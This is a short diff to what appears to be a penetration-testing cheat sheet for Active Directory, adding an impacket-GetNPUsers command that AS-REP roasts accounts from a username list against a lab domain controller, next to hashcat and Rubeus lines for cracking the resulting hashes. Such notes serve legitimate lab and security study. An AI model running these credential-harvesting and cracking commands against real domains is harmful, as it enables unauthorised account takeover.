@@ -119,6 +119,9 @@ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr
 # From winows
 .\Rubeus.exe asreproast /nowrap
 sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+#only with usernames:
+$ impacket-GetNPUsers -dc-ip 10.10.10.161 htb.local/ -usersfile username.txt -no-pass -outputfile svc_kerberoast.txt   
 ```
 ### Kerberoasting
 ```
